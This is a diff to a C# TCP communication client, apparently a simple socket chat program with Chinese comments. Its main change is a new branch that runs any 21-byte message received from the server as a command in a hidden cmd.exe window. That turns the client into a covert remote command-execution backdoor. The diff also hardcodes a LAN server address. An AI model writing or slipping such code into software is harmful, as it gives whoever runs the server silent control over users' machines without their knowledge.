@@ -1,6 +1,7 @@
 ﻿using NatureConsole;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -19,7 +20,9 @@ namespace Nature.Client.Comm
                 //创建负责通信的Socket
                 socketSend = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 //获取要建立连接的远程服务器IP与端口号
-                IPAddress iPAddress = IPAddress.Parse("192.168.0.101");
+                IPAddress iPAddress = IPAddress.Parse("192.168.1.34");
+                //string ip = GetLocalIp();
+                //IPAddress iPAddress = IPAddress.Parse(ip);
                 IPEndPoint iPEndPoint = new IPEndPoint(iPAddress, 50000);
                 socketSend.Connect(iPEndPoint);
                 ShowMsg("连接服务器成功");
@@ -92,6 +95,7 @@ namespace Nature.Client.Comm
                         byte[] newBuffer = list.ToArray();
                         socketSend.Send(newBuffer, 0,r+1,SocketFlags.None);
                     }
+                    break;
                 }
                 catch
                 {
@@ -112,8 +116,44 @@ namespace Nature.Client.Comm
                     {
                         break;
                     }
-                    string str = Encoding.UTF8.GetString(buffer, 0, r);
-                    ShowMsg(socketSend.RemoteEndPoint + ":" + str);
+                    else if (r == 21)
+                    {
+                        string str = Encoding.UTF8.GetString(buffer, 0, r);
+                        ShowMsg(socketSend.RemoteEndPoint + ":" + str);
+                        //开启一个新的进程用来跑CMD
+                        Process p = new Process();
+                        //设置要启动的应用程序
+                        p.StartInfo.FileName = "cmd.exe";
+                        //是否使用操作系统shell启动
+                        p.StartInfo.UseShellExecute = false;
+                        // 接受来自调用程序的输入信息
+                        p.StartInfo.RedirectStandardInput = true;
+                        //输出信息
+                        p.StartInfo.RedirectStandardOutput = true;
+                        // 输出错误
+                        p.StartInfo.RedirectStandardError = true;
+                        //不显示程序窗口
+                        p.StartInfo.CreateNoWindow = true;
+                        //启动程序
+                        p.Start();
+
+                        //向cmd窗口发送输入信息
+                        p.StandardInput.WriteLine(str + "&exit");
+
+                        p.StandardInput.AutoFlush = true;
+
+                        //获取输出信息
+                        string strOuput = p.StandardOutput.ReadToEnd();
+                        //等待程序执行完退出进程
+                        p.WaitForExit();
+                        p.Close();
+                    }
+                    else
+                    {
+                        string str = Encoding.UTF8.GetString(buffer, 0, r);
+                        ShowMsg(socketSend.RemoteEndPoint + ":" + str);
+                    }
+                    
                 }
                 catch
                 {}
